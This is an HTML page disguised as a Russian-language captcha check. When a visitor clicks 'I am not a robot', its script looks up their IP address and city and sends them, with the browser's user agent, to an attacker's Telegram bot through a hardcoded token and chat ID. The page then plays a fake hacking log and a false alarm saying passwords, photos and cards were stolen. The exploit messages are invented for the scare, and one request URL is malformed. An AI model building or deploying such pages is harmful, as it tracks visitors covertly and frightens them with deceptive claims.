<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 14px; }
 
        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
      
        #terminal { display: none; padding: 20px; line-height: 1.5; }
        .t-target { color: #ff8c00; } .t-init { color: #0f0; } .t-success { color: #0f0; font-weight: bold; }
        .t-info { color: #0f0; } .t-warning { color: #ff8c00; } .t-critical { color: red; font-weight: bold; }

 
        #leak-box { display: none; padding: 20px; }
        .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
    </style>
</head>
<body>

  
    <div id="captcha-box">
        <img src="https://www.gstatic.com" width="80">
        <h2>Подтвердите, что вы не робот</h2>
        <button class="btn-verify" onclick="startProcess()">Я не робот</button>
    </div>

  
    <div id="terminal"></div>

 
    <div id="leak-box">
        <div class="danger-ui">
            <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
            <hr color="red">
            <p>> IP: <span id="user-ip">...</span></p>
            <p>> Город: <span id="user-geo">...</span></p>
            <p style="color: red;">⚡ СКОПИРОВАНО: Пароли, Фото, Карты</p>
        </div>
    </div>

    <script>
        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
        const chat_id = "-1003861311533";

 
        const sleep = ms => new Promise(res => setTimeout(res, ms));

        async function startProcess() {
            document.getElementById('captcha-box').style.display = 'none';
            const term = document.getElementById('terminal');
            term.style.display = 'block';

 
            sendLogs();

      
            const lines = [
                `<span class="t-target">[TARGET]</span> IP: Определение...`,
                `<span class="t-target">[TARGET]</span> OS: ${navigator.platform}`,
                `<span class="t-init">[INIT]</span> Обход reCAPTCHA v2...`,
                `<span class="t-success">[SUCCESS]</span> Токен верификации получен`,
                `<span class="t-info">[INFO]</span> Инициализация эксплойта CVE-2024-8192...`,
                `<span class="t-warning">[WARNING]</span> Обнаружена уязвимость в WebRTC`,
                `<span class="t-info">[INFO]</span> Переполнение буфера...`,
                `<span class="t-critical">[CRITICAL]</span> Доступ к ядру получен`,
                `<span class="t-info">[INFO]</span> Отключение защитных механизмов...`,
                `<span class="t-success">[SUCCESS]</span> Windows Defender отключен`,
                `<span class="t-warning">[WARNING]</span> Антивирус обнаружен: обход активен`,
                `<span class="t-info">[INFO]</span> Инжект в процесс lsass.exe...`,
                `<span class="t-success">[SUCCESS]</span> Системные привилегии получены`,
                `<span class="t-info">[INFO]</span> Сканирование %APPDATA%...`
            ];

        
            for (let line of lines) {
                const p = document.createElement('p');
                p.innerHTML = line;
                p.style.margin = "5px 0";
                term.appendChild(p);
                window.scrollTo(0, document.body.scrollHeight);
                await sleep(600);  
            }

            await sleep(1000);
            term.style.display = 'none';
            document.getElementById('leak-box').style.display = 'block';
        }

        async function sendLogs() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                document.getElementById('user-ip').innerText = d.ip;
                document.getElementById('user-geo').innerText = d.city;

                const msg = `🔥 ЖЕРТВА КЛИКНУЛА!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
            } catch (e) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Переход_без_IP`);
            }
        }
    </script>
</body>
</html>
